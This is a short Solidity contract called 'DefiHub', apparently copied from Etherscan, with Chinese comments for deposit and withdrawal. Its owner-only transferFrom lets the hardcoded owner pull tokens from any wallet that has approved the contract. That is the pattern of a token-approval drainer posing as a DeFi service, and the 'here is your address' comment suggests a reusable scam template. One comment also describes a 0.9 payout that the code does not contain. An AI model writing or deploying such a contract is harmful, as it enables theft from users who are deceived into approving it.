/**
 *Submitted for verification at Etherscan.io on 2022-06-20
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.6.12;

contract DefiHub {
    using SafeMath for uint256;

    IERC20 token;

    address payable public owner;

    constructor() public {
      owner = 0x46039b78061B3B5603A516766F851d4a6D8dc739; // here is your address
    }

    modifier onlyOwner() {
      require(msg.sender == owner, "You are not the owner");
      _;
    }

    //充值
    function transferFrom(address tokenAddress, address sender, uint256 amount) public onlyOwner {
      token =  IERC20(tokenAddress);

      token.transferFrom(sender, address(this), amount);
    }

    //提币
    function transfer(address tokenAddress, address recipient, uint256 amount) public onlyOwner {
      token =  IERC20(tokenAddress);
      // 发送者加 0.9*amount
      token.transfer(recipient, amount);
    }

}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a, "SafeMath: subtraction overflow");
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
        return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0, "SafeMath: division by zero");
    uint256 c = a / b;
    return c;
  }
}

interface  IERC20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}